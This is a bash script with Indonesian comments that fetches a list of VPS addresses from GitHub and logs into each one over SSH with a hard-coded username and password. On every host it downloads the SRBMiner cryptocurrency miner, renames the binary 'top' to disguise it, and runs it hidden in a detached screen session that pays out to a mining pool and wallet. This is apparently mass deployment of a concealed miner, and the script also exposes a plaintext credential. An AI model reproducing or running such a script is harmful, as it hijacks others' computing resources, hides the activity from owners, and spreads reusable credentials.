#!/bin/bash

# URL raw GitHub file berisi daftar VPS Eropa
EUROPE_VPS_LIST_URL="https://github.com/monhodsompul/evttt/raw/refs/heads/main/all.txt"
EUROPE_VPS_LIST="all.txt"

# Mengunduh file vps_list.txt dari URL
curl -o $EUROPE_VPS_LIST $EUROPE_VPS_LIST_URL

# Pastikan expect terpasang untuk menangani login otomatis dengan password
if ! command -v expect &> /dev/null
then
    echo "Expect belum terpasang. Install dengan: sudo apt install expect"
    exit
fi

# Fungsi untuk menjalankan script di satu VPS
run_script() {
    local IP=$1
    local USER="cloudsigma"         # Menetapkan USER
    local PASSWORD="Dotaja123@HHHH"   # Menetapkan PASSWORD
    local COMMAND=$2
    local COUNT=$3

    echo "Menghubungkan ke VPS: $IP dengan user: $USER"

    # Menggunakan expect untuk login otomatis dan menjalankan script
    /usr/bin/expect << EOF
    set timeout 10
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r" }
    }
    expect "*$*"  # Prompt yang menandakan login berhasil (misalnya root prompt)
    send "$COMMAND\r"
    expect "*$*"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
}

COUNT=1

# Membaca daftar VPS Eropa dan menjalankan script
while IFS=',' read -r IP; do
    EUROPE_SCRIPT_COMMAND="wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz && tar -xf SRBMiner-Multi-2-5-6-Linux.tar.gz && cd SRBMiner-Multi-2-5-6 && mv SRBMiner-MULTI top && screen -dmS luck ./top -a flex -o eu.mpool.live:5271 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky-$COUNT "
    run_script "$IP" "$EUROPE_SCRIPT_COMMAND" &  # Jalankan perintah untuk VPS Eropa
    COUNT=$((COUNT + 1))
done < $EUROPE_VPS_LIST

# Tunggu semua proses selesai
wait

clear
echo "Selesai menjalankan script di semua VPS."
